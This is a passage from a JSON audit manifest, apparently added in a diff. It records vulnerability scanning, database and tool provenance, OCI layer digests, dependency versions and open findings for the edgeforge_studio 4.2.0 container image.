+      "log_sha256": "79d30422388543b2563e1dde76bb7e7857d7ef0c6fdf05c8c71598633ca07e1e",
+      "started_utc": "2026-10-26T02:31:07.063458+00:00"
+    },
+    "kernel-header-inventory": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:31:20.681844+00:00",
+      "log": "kernel-header-inventory.log",
+      "log_sha256": "a1c068ba051f63a5f14067000f8b12adaea08ac6d32f35fe62c053380e69bd2d",
+      "started_utc": "2026-10-26T02:31:20.550895+00:00"
+    },
+    "trivy-db-public": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:20:12.535575+00:00",
+      "log": "trivy-db-public.log",
+      "log_sha256": "20119637b21b4769ddecf389222a70325f3cb279844b43cd3be97f4e5e06f978",
+      "started_utc": "2026-10-26T02:20:05.781317+00:00"
+    },
+    "trivy-java-db-public": {
+      "exit_code": 0,
+      "finished_utc": "2026-10-26T02:20:41.203162+00:00",
+      "log": "trivy-java-db-public.log",
+      "log_sha256": "0951a3e4fa376357b12990b106da30f9759cff2fade40392230dff9526754ec8",
+      "started_utc": "2026-10-26T02:20:08.720525+00:00"
+    }
+  },
+  "corrected_audits": {
+    "findings": 0,
+    "image": 94,
+    "omissions": 0,
+    "reference": 95
+  },
+  "database_metadata": {
+    "grype": {
+      "client_version": "v6.1.9",
+      "digest": "xxh64:d97251f8f3b439f7",
+      "source": "https://grype.anchore.io/databases/v6/vulnerability-db_v6.1.10_2026-10-25T00:33:23Z_1792909654.tar.zst?checksum=sha256%3A4bdb42924659936a80a73f5df039603dc01734ed6032575b9879745216a713ea"
+    },
+    "trivy": {
+      "DownloadedAt": "2026-10-26T02:20:12.493949Z",
+      "NextUpdate": "2026-10-27T01:20:01.380937429Z",
+      "UpdatedAt": "2026-10-26T01:20:01.38093772Z",
+      "Version": 2
+    },
+    "trivy_java": {
+      "DownloadedAt": "2026-10-26T02:20:41.18934Z",
+      "NextUpdate": "2026-10-29T00:59:12.44483502Z",
+      "UpdatedAt": "2026-10-26T00:59:12.444835411Z",
+      "Version": 1
+    }
+  },
+  "databases": {
+    "grype-db/6/import.json": {
+      "bytes": 269,
+      "sha256": "bbb35513f83a552ba8ca2d9af6e3732279d0ba8fd8b8e2d2d7eab220e101f7ce"
+    },
+    "grype-db/6/last_update_check": {
+      "bytes": 20,
+      "sha256": "c8c3534e0f2f1f6904377c28da9e780d9c98957ac75ce158e5900bcb5b80ecaf"
+    },
+    "grype-db/6/vulnerability.db": {
+      "bytes": 3337875456,
+      "sha256": "48861960af9ae103b6a1618a579ec83e2ab7db4d82e874bcbc1a52a264958084"
+    },
+    "trivy-cache/db/metadata.json": {
+      "bytes": 149,
+      "sha256": "057e441406fa0db05bfc6d7e6565a9721aa125e7105530dcc92531f604e8a8d0"
+    },
+    "trivy-cache/db/trivy.db": {
+      "bytes": 1641508864,
+      "sha256": "feefbadc2ac95624d885203a353f131072c2ee4a03700d8ff4462151abc4ce0a"
+    },
+    "trivy-cache/fanal/fanal.db": {
+      "bytes": 2097152,
+      "sha256": "9aac5bbe38cffd8d64b0a6cf97e36c520ac3e8a8452f7e36bbe028d361546d97"
+    },
+    "trivy-cache/java-db/metadata.json": {
+      "bytes": 148,
+      "sha256": "b80d19c57955d91d4f691ee158abf7ddf6d97f1bbfa7d1875c2f250b5e067845"
+    },
+    "trivy-cache/java-db/trivy-java.db": {
+      "bytes": 1564295168,
+      "sha256": "148a3e77d8a7df1c28ad261c4f72085fe0eb9d1354c4cf400e9abe963825a2c4"
+    }
+  },
+  "date_local": "2026-10-25",
+  "dependency_changes": {
+    "fastmcp": [
+      "3.4.0",
+      "3.4.10"
+    ],
+    "fastmcp-slim": [
+      "3.4.0",
+      "3.4.10"
+    ],
+    "opentelemetry-api": [
+      "1.43.0",
+      "1.45.1"
+    ],
+    "setuptools": [
+      "83.0.0",
+      "84.1.0"
+    ]
+  },
+  "engine_sha": "d148ca50722a676359ec7c7296561f79f99e2b69",
+  "historical_comparison": {
+    "current_groups": 2948,
+    "historical_groups": 3840,
+    "historical_not_observed_now": 2783,
+    "new_or_changed_identity": 1891,
+    "same_identity": 1057,
+    "silent_is_not_remediated": true
+  },
+  "host": "macOS arm64; Docker Desktop Linux aarch64 VM; assessed linux/amd64 through emulation",
+  "image_tested_studio_sha": "515435c351e9a203c9ddce30ee62281b54fbe092",
+  "limitations": [
+    "Provisional pairing, not final release acceptance or M2 clearance",
+    "Fresh APT/database observation does not close scanner-silent historical findings",
+    "No fresh whole JDK/Maven stage or transient-build campaign; historical stages remain separate",
+    "Vendored/seed certifi, urllib3, msgpack and pkg_resources remain OPEN; standalone audit is not embedded-code coverage",
+    "No Node-dependent image test campaign or native VoiceOver observation",
+    "Source-only publication does not accept residual image risks"
+  ],
+  "new_critical": {
+    "affected_code": "Linux kernel fs/btrfs/xattr.c; installed UAPI headers are not that kernel implementation",
+    "component": "linux-libc-dev",
+    "id": "CVE-2026-98959",
+    "limit": "No claim about Docker host kernel applicability; header observation retained, not accepted or suppressed",
+    "owner": "Studio image maintainer; deployment host kernel owner separately",
+    "primary_source": {
+      "retrieved_utc": "2026-10-26T02:27:05.632743+00:00",
+      "sha256": "cda30094ebe9b8c9e8f4c06ada0b22428243afcbc2796f5593d20154e9c04b22",
+      "url": "https://cveawg.mitre.org/api/cve/CVE-2026-98959"
+    },
+    "state": "OPEN",
+    "trigger": "Selected-pair assessment or authoritative applicability/fix change",
+    "version": "6.1.190-1"
+  },
+  "oci": {
+    "config_digest": "sha256:861a79ba68b7540ec338adb45a4e9c60887159acc6eda60bec86e5dc74402bac",
+    "config_user": "appuser",
+    "created": "2026-10-26T02:21:02.432385711Z",
+    "index_digest": "sha256:872b4c81380a58e47ced7c70096f0ecb1133b52d8b1767b43deb9d847c9bdab8",
+    "layers": [
+      {
+        "compressed_bytes": 28249323,
+        "compressed_digest": "sha256:7fd1ebe418b5079d4aa36f416af9b143d127bc75b0155d71cb5fd559b5e04d39",
+        "filesystem_diff_id": "sha256:e58989146fcec76699871403b9897b5c014af1ccd85f5a9300a215e7975525d7"
+      },
+      {
+        "compressed_bytes": 3342349,
+        "compressed_digest": "sha256:29a6e787b2e07b2b8a2c88b600812f9f7588374cf74e6f17d696695c8984d900",
+        "filesystem_diff_id": "sha256:ba0f973ad05d82f20d8dd8dc79a9d1b71e9d90ab48380d8c0912fad39dda5ced"
+      },
+      {
+        "compressed_bytes": 14892797,
+        "compressed_digest": "sha256:aded561bdc17f79b65ec824282d38146fac0eb9d8951b9a7a4ca462bbea8c21d",
+        "filesystem_diff_id": "sha256:8664c9b18215e1141ccc8fa3cbc7483f4cd16fb5230b570fa7c744da58251da3"
+      },
+      {
+        "compressed_bytes": 250,
+        "compressed_digest": "sha256:29d8700fe216d98a8d918ecf891265355e2ca697f9c11e8290d00813caaed60d",
+        "filesystem_diff_id": "sha256:c167899be569aee196241ae0905aeed34708881d5a8784be3de0ed9bf9db7200"
+      },
+      {
+        "compressed_bytes": 158117459,
+        "compressed_digest": "sha256:a0cee8a985a0cde87641a0f83824761c8985a996c0e00b3be2b33678d892827a",
+        "filesystem_diff_id": "sha256:268235a001a001dee928c2620b623dea6203dbedd1e1fb093ac452b5cde1e552"
+      },
+      {
+        "compressed_bytes": 9359419,
+        "compressed_digest": "sha256:b8c25bfc18fc6f52a43e056e974d49091d9525ecb04a18571a628ea43fce8dca",
+        "filesystem_diff_id": "sha256:0396d1e1145cd950b38dd096a1ddea75b826c2b4b34c6ae2b1608e555b652896"
+      },
+      {
+        "compressed_bytes": 116649460,
+        "compressed_digest": "sha256:8332491212d47f2f882d6fa63823f7cc10e8fef5f7619e71776a77c2710526ac",
+        "filesystem_diff_id": "sha256:c06fb85e5e7042b7e536766cdf7c5732a209c40acccf14f67c7928b6134b85b0"
+      },
+      {
+        "compressed_bytes": 3316,
+        "compressed_digest": "sha256:e3585beb29c8035c22f05cd933f74bc218fb770eb365b6dd18010177a3a68fca",
+        "filesystem_diff_id": "sha256:f4151daf3a7b8f69d60dd7c03f54ec9a30a1b362ab2489b74cc46175ad3790ce"
+      },
+      {
+        "compressed_bytes": 131,
+        "compressed_digest": "sha256:a79c520738cd4947e5bddc1eda84b8e956c355b83e07133a4bd023551b77f456",
+        "filesystem_diff_id": "sha256:f1a6d9dcd8f6812dc112bf210f8f79ada14fae8aa369477f2a6110cf69ed4246"
+      },
+      {
+        "compressed_bytes": 1380,
+        "compressed_digest": "sha256:919667791b5620655d4dbf0a33e0c9640f1d0ba91e167fb5ec203a870aa26644",
+        "filesystem_diff_id": "sha256:2d9ce9d616d6cbd6ad953d47e85cde1e72cdb80c2bf83b894d068b643ddc8959"
+      },
+      {
+        "compressed_bytes": 979,
+        "compressed_digest": "sha256:d52c4c3c62f97a58b40a04fdb2df28e0d06bac882c545fccc76976d9b7eac6b5",
+        "filesystem_diff_id": "sha256:391d0bbcabe3e4f0c88650c37540a8acbb24d554282f4c556c4f42f667047a68"
+      },
+      {
+        "compressed_bytes": 61739867,
+        "compressed_digest": "sha256:fbb9e8b8af8b93ed6949e417a93219d88e1a9e52b33604fefe990d97ce5c8119",
+        "filesystem_diff_id": "sha256:eb60ade7e083fe8d842b9064b3e2a31eb60e35b98a85b8394cfdd5f475d449c9"
+      },
+      {
+        "compressed_bytes": 484886,
+        "compressed_digest": "sha256:34a65c3fbfed7bb56a23cd6026441154ce615a94e89b44076af841e0289ad824",
+        "filesystem_diff_id": "sha256:b3aef1587ac670c047ef16b98adc93034f6ec2d56594a0f0b5edf1e8f79c9465"
+      },
+      {
+        "compressed_bytes": 4250,
+        "compressed_digest": "sha256:834f24438a7dc54fb81dfa8d366493ce01b2e23080a7687587afe8358f5503f6",
+        "filesystem_diff_id": "sha256:aeeee4c2ac7ced4f2e0b7eff7b868653a56997c5e3e80de001e02e4877270e72"
+      },
+      {
+        "compressed_bytes": 173,
+        "compressed_digest": "sha256:3fbd7ecf50510b899c94fd1b513a12f41b4584743773a7f7addba581fe394382",
+        "filesystem_diff_id": "sha256:fbba5c747a936a32a501aa362a77aafeb25360a931c682468918c23a24cbc84c"
+      },
+      {
+        "compressed_bytes": 327445,
+        "compressed_digest": "sha256:4a96871aba8b59fb0b9f0936fb58c8beb753f5a76e918c5ddb3d47958c820b63",
+        "filesystem_diff_id": "sha256:9cb5a8966dbc0f84efde151c673c92c002fc0feca8242236c12254cbbe64b9aa"
+      },
+      {
+        "compressed_bytes": 818180,
+        "compressed_digest": "sha256:7e021b724338b9c5f257d3d849be3142235f5043dbb96db06d1602fa4ff6364b",
+        "filesystem_diff_id": "sha256:ec7a8fdfb9f2565017b2584b10292da6e2d4aa5bb6b3ffe489014af5beccfbcd"
+      }
+    ],
+    "platform": "linux/amd64",
+    "platform_manifest_digest": "sha256:5fa784ef0a09557fe92b2b75fb40d1120bc6e14542f01144583ad58ad11c5e32",
+    "verified": true
+  },
+  "package_artifacts": {
+    "author": "Santosh Hommaradi",
+    "license_and_notice_in_both": true,
+    "license_expression": "Apache-2.0",
+    "requires_python": ">=3.11",
+    "sdist": "edgeforge_studio-4.2.0.tar.gz",
+    "sdist_sha256": "fbd9cbc7d6aa1b9e7a7e082d26afea6f238ff13a5fa445ceb30dc91ac6ba3436",
+    "wheel": "edgeforge_studio-4.2.0-py3-none-any.whl",
+    "wheel_sha256": "bbbdfab21f1008cc4779c9eb46f65cf0ed057fdd5a68fa14c188243227a421d1"
+  },
+  "primary_package_metadata": [
+    {
+      "retrieved_utc": "2026-10-26T02:05:10.388202+00:00",
+      "sha256": "b782ff4a784f3fdd6c1056db8a1636f4e2f8a8b41ed8d33417fde394d463732d",
+      "url": "https://pypi.org/pypi/fastmcp/3.4.10/json"
+    },
+    {
+      "retrieved_utc": "2026-10-26T02:05:10.452784+00:00",
+      "sha256": "583f0d01042000c121928094f89e574a4285e1cab428c8758e44b9b37df5fcc7",
+      "url": "https://pypi.org/pypi/fastmcp-slim/3.4.10/json"
+    },
+    {
+      "retrieved_utc": "2026-10-26T02:05:10.518981+00:00",
+      "sha256": "da574eb54158846f06ac0a51034378feb22c47be67856f001da7337f3a116d2c",
+      "url": "https://pypi.org/pypi/opentelemetry-api/1.45.1/json"
+    },
+    {
+      "retrieved_utc": "2026-10-26T02:05:10.576535+00:00",
+      "sha256": "75427bb7a4289a8f06fe176e3eab998710051b36706c80c1df7e796000372f02",
+      "url": "https://pypi.org/pypi/setuptools/84.1.0/json"
+    }
+  ],
+  "private_inputs_sha256": {
+    "build-metadata.json": "1279ad38cc18366a1cb8ca56a7c8fb4cda32b282f31ab76d5d57ef19a01e4a54",
+    "final-grype.json": "423c9ee50e062cab544a8644af88a5c8630ce98c38133e77bb54619a1b2bf2a2",
+    "final-summary.json": "038c58966e9fc3d2a92b68499af2567d18ebb2426b13e49dc6f106314b38637a",
+    "final-syft.json": "7a27b4196b90deef729da937b6f0db1e289f45113e4f967f523de92c4acdabc9",
+    "final-trivy.json": "bc8268b77de06ea24a739ff94936669ea437d35e2dc770c9fb65979a87d23a2e",
+    "image-audit.json": "074a9ccd4d3017dca2c215e289b8adaf414e066a1bd9da49bdf0051201845cc4",
+    "image-installed.txt": "4e4470c34f48bd27df1c3355984b934217a08d07177dedfc7d0c99b9de7d98b0",
+    "image-oci.log": "3dcd187ef95ba77d5333e1580a4ef8547f840303251ce78040803e38ab1e35e6",
+    "image-probe.log": "cd5c042c85546054029539ecf407c203ba18451d086062ff7c2118a76d503ab8",
+    "image.tar": "3a89d5a605eeefcc218c189b3933dc243c036e331f750e5c3af395b8bddd8ed1",
+    "jdk-base-index.json": "3e3c176ffed168beb42c607be9bc1639b466cf00261a0fb04425562c9d0c5c2b",
+    "kernel-header-inventory.log": "a1c068ba051f63a5f14067000f8b12adaea08ac6d32f35fe62c053380e69bd2d",
+    "python-base-index.json": "a1165e272e578941b84abc79e4ab38a0305cd12803a5c4247979ac7655f4d641"
+  },
+  "scanner_tools": [
+    {
+      "archive": "syft_1.52.0_darwin_arm64.tar.gz",
+      "archive_sha256": "014d561b6d13059124155f74a6c5a9a99501f5e209313638dd884f39eb418ee6",
+      "archive_url": "https://github.com/anchore/syft/releases/download/v1.52.0/syft_1.52.0_darwin_arm64.tar.gz",
+      "checksum_url": "https://github.com/anchore/syft/releases/download/v1.52.0/syft_1.52.0_checksums.txt",
+      "executable_sha256": "17e4215af72264e186a843269d0b797697d643f53841d9598f73614bbcbe9022",
+      "name": "syft",
+      "retrieved_utc": "2026-10-11T17:06:49.734025+00:00",
+      "version": "1.52.0"
+    },
+    {
+      "archive": "grype_0.119.0_darwin_arm64.tar.gz",
+      "archive_sha256": "500c9b2b6c089d21481815f57a553fabbd441ec7d1e79d95e3aaf40c3bfc7e36",
+      "archive_url": "https://github.com/anchore/grype/releases/download/v0.119.0/grype_0.119.0_darwin_arm64.tar.gz",
+      "checksum_url": "https://github.com/anchore/grype/releases/download/v0.119.0/grype_0.119.0_checksums.txt",
+      "executable_sha256": "f8486425f232aea78fc932249ca0923672d88be36c9661e25e82ea1fa8cd0cae",
+      "name": "grype",
+      "retrieved_utc": "2026-10-11T17:06:51.456243+00:00",
+      "version": "0.119.0"
+    },
+    {
+      "archive": "trivy_0.74.0_macOS-ARM64.tar.gz",
+      "archive_sha256": "1caada5e0e2091909357c7525d3aa76f4b660b13821bc143b190c7483e31cc11",
+      "archive_url": "https://github.com/aquasecurity/trivy/releases/download/v0.74.0/trivy_0.74.0_macOS-ARM64.tar.gz",
+      "checksum_url": "https://github.com/aquasecurity/trivy/releases/download/v0.74.0/trivy_0.74.0_checksums.txt",
+      "executable_sha256": "0ed07c205ca9ecc1065dc57b9f9f77adc79393bb469d9d1de9ec90c8c94ffc2f",
+      "name": "trivy",
+      "retrieved_utc": "2026-10-11T17:06:53.968002+00:00",
+      "version": "0.74.0"
+    }
+  ],
+  "schema_version": 1,
+  "source_archive_sha256": {
+    "engine-source.tar": "6114e7bc3db362d404f5be5b5835f1265a27616eec1309e48c68dd43183e1468",
+    "studio-source.tar": "a1f658264d45fb3b0cd9bd3258f30caa28b23bd7ce2a170acb3f858c30927974"
+  },
+  "source_files_sha256": {
+    "Dockerfile": "c76641a97bc3ef78861a68924a6399295e53afbc430c509f5d6e1e1106b40eec",
+    "constraints.txt": "f454599d8aa17924de40fdd6af040844d5e492335409a3d40b47f93561ffa730",
+    "pyproject.toml": "578453c43ef3b6bff5abae751fedde3d1a56706e06c899163b13a2707fd66c06",
+    "requirements.txt": "bb635b3df724de75a95c07e5ab92a70c39972b0e46464b4c2ba02418aa287e19",
+    "scripts/image_bootstrap_proof.py": "6a448e2820f6fff080ad5000ea71bf8e4fccbb412c6105ccbd2ab61ec43cebe7",
+    "scripts/install_apache_maven.py": "8fba8bc732681c191551369bad797df829fd730e6bdfcff52c5e9bc0bc5dd3b3",
+    "scripts/maven_image_build_run_proof.py": "aaec27eb581cd307d8ef79950546e1ec6543b92abfb0f4d1441f159082526b0f",
+    "scripts/verify-packaging-toolchain.py": "42954666f6b33ae5562241437ddea9b6ede1bb2566e4ce690eef3902a512dadd",
+    "scripts/verify_image_oci.py": "e72a0fa47a28719dd548133643b6fd631b0211cd300ebd91a08d692b5275bc17"
+  },
+  "toolchain": {
+    "active_private_certifi": {
+      "sha256": "bbc7e9c01d7551bb8a159b5dedd989b8ee3ce105aff522b68eb1b01bf854cab0",
+      "state": "OPEN",
+      "version": "2026.06.17"
+    },
+    "active_private_urllib3": {
+      "state": "OPEN",
+      "version": "2.7.0"
+    },
+    "embedded_expat": "expat_2.8.5",
+    "independent_seed_copies": [
+      {
+        "copies": {
+          "pip/_vendor/certifi/__init__.py": {
+            "sha256": "f96d51ff2f1609a4a44f5b5d8eec47ff34c1658d581fac5081d3759db05a8ce1",
+            "version": "2026.06.17"
+          },
+          "pip/_vendor/certifi/cacert.pem": {
+            "sha256": "bbc7e9c01d7551bb8a159b5dedd989b8ee3ce105aff522b68eb1b01bf854cab0",
+            "version": null
+          },
+          "pip/_vendor/urllib3/_version.py": {
+            "sha256": "fa032b2a1b0f88e8f45f351ecd515ae7d7754ba4204222a0413e601a0c8cf3ec",
+            "version": null
+          }
+        },
+        "name": "pip-26.2.1-py3-none-any.whl",
+        "sha256": "71138adf1f4ca900cdb7d289c21b7494329f2332b6d85f0e1c42108c0384ed3e"
+      }
+    ],
+    "installed": {
+      "Authlib": "1.7.2",
+      "Jinja2": "3.1.6",
+      "MarkupSafe": "3.0.3",
+      "PyJWT": "2.15.0",
+      "PyYAML": "6.0.2",
+      "Pygments": "2.20.0",
+      "SecretStorage": "3.5.0",
+      "aiofile": "3.11.1",
+      "annotated-doc": "0.0.4",
+      "annotated-types": "0.7.0",
+      "anyio": "4.14.2",
+      "attrs": "26.1.0",
+      "beartype": "0.22.9",
+      "cachetools": "7.1.4",
+      "caio": "0.9.25",
+      "certifi": "2026.10.19",
+      "cffi": "2.0.0",
+      "charset-normalizer": "3.4.7",
+      "click": "8.4.2",
+      "cryptography": "50.0.0",
+      "cyclopts": "4.19.0",
+      "dnspython": "2.8.0",
+      "docstring_parser": "0.18.0",
+      "email-validator": "2.3.0",
+      "et_xmlfile": "2.0.0",
+      "exceptiongroup": "1.3.1",
+      "fastapi": "0.138.1",
+      "fastmcp": "3.4.10",
+      "fastmcp-slim": "3.4.10",
+      "griffelib": "2.1.0",
+      "h11": "0.16.0",
+      "httpcore": "1.0.9",
+      "httpcore2": "2.12.0",
+      "httptools": "0.8.0",
+      "httpx": "0.28.1",
+      "httpx-sse": "0.4.3",
+      "httpx2": "2.12.0",
+      "idna": "3.18",
+      "iniconfig": "2.3.0",
+      "jaraco.classes": "3.4.0",
+      "jaraco.context": "6.1.2",
+      "jaraco.functools": "4.5.0",
+      "jeepney": "0.9.0",
+      "joserfc": "1.7.1",
+      "jsonref": "1.1.0",
+      "jsonschema": "4.26.0",
+      "jsonschema-path": "0.5.0",
+      "jsonschema-specifications": "2025.9.1",
+      "keyring": "25.7.0",
+      "lxml": "6.1.1",
+      "markdown-it-py": "4.2.0",
+      "mcp": "1.30.0",
+      "mdurl": "0.1.2",
+      "more-itertools": "11.1.0",
+      "openapi-pydantic": "0.5.1",
+      "openpyxl": "3.1.5",
+      "opentelemetry-api": "1.45.1",
+      "packaging": "26.2",
+      "pathable": "0.6.0",
+      "pdfminer.six": "20260107",
+      "pdfplumber": "0.11.10",
+      "pillow": "13.0.0",
+      "pip": "26.2.1",
+      "platformdirs": "4.10.0",
+      "pluggy": "1.6.0",
+      "py-key-value-aio": "0.4.5",
+      "pycparser": "3.0",
+      "pydantic": "2.11.7",
+      "pydantic-settings": "2.14.2",
+      "pydantic_core": "2.33.2",
+      "pypdfium2": "5.10.1",
+      "pyperclip": "1.11.0",
+      "pytest": "9.0.3",
+      "pytest-asyncio": "1.4.0",
+      "python-docx": "1.2.0",
+      "python-dotenv": "1.2.2",
+      "python-multipart": "0.0.31",
+      "referencing": "0.37.0",
+      "rich": "15.0.0",
+      "rich-rst": "2.0.2",
+      "rpds-py": "2026.5.1",
+      "ruamel.yaml": "0.19.1",
+      "setuptools": "84.1.0",
+      "sse-starlette": "3.4.5",
+      "starlette": "1.3.1",
+      "truststore": "0.10.4",
+      "typing-inspection": "0.4.2",
+      "typing_extensions": "4.15.0",
+      "uncalled-for": "0.3.2",
+      "uvicorn": "0.49.0",
+      "uvloop": "0.22.1",
+      "watchfiles": "1.2.0",
+      "websockets": "16.0",
+      "wheel": "0.48.0"
+    },
+    "license_sha256": "cfc7749b96f63bd31c3c42b5c471bf756814053e847c10f3eb003417bc523d30",
+    "notice_sha256": "4110fa0fbb7e34e7b243b3e99a7c42d50af685382fba695af13e01e90011e649",
+    "platform": "Linux-6.12.76-linuxkit-x86_64-with-glibc2.36",
+    "python": "3.13.16 (main, Oct  6 2026, 02:04:05) [GCC 12.2.0]",
+    "selected": {
+      "certifi": "2026.10.19",
+      "fastmcp": "3.4.10",
+      "fastmcp-slim": "3.4.10",
+      "opentelemetry-api": "1.45.1",
+      "pillow": "13.0.0",
+      "pip": "26.2.1",
+      "setuptools": "84.1.0"
+    },
+    "standalone_certifi": {
+      "sha256": "50f79f98dac192b20dbf73f35c56f0b0c557ab267ff5199d1117cc1180b70785",
+      "version": "2026.10.19"
+    },
+    "system_ssl": "OpenSSL 3.0.22 25 Aug 2026",
+    "uid": 1000
+  }
+}
